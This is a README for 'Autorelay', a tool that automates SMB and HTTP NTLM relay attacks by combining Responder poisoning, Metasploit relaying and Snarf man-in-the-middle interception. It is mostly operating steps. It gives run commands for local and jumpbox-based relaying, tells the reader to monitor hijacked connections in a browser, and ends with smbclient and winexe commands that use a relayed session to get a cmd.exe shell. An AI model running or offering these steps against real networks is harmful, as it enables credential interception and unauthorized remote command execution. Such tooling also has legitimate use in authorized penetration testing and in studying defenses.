# Autorelay

Automatically performs the SMB relay attack either locally or on a remote device. Uses Responder to poison, Metasploit for HTTP NTLM relay (rather than just SMB relay), and Snarf for the MITM'ing. When using locally, only requires an interface and an nmap XML file or a list of IPs on the target network to determine SMB hosts. When used for SMB relaying on a jumpbox, requires the IP address of the jumpbox.


## Usage

#####Local

* sudo ./autorelay.py -x local-network.xml -i eth0

* sudo ./autorelay.py -l ips.txt -i eth0

#####Remote

* sudo ./autorelay.py -x remote-network.xml -i eth0 -r 95.34.53.243 

* sudo ./autorelay.py -l ips.txt -i eth0 -r 95.34.53.243 

---


Point your local browser to http://localhost:4001 and refresh it periodically to see your MITM'd connections


After a connection is expired (or you expire it), click "choose"


Run this command locally if relaying locally or run it on the jumpbox if you're relaying remotely: smbclient -U a%a //127.0.0.1


Alternatively, if you gain admin rights through the SMB connection spawn a shell with: winexe -U a%a //127.0.0.1 -U cmd.exe

